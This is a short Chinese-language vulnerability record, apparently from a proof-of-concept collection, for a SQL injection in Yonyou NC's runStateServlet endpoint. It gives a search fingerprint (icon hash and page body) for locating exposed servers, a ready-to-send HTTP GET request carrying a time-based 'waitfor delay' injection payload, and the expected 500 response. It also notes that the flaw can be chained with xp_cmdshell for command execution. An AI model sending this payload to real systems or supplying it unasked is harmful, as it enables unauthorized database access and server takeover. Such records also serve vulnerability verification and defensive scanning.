﻿# 用友NC runStateServlet SQL注入漏洞

> 更新时间：2024-04-19

> 漏洞编号：

> 漏洞说明：用友NC /portal/pt/servlet/runStateServlet接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。

> 漏洞特征：icon_hash="1085941792" && body="/logo/images/logo.gif"

> 验证脚本：HTTP

```
GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Content-Type: application/x-www-form-urlencoded
```

> 响应代码特征：500

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友NC runStateServlet SQL注入漏洞.poc

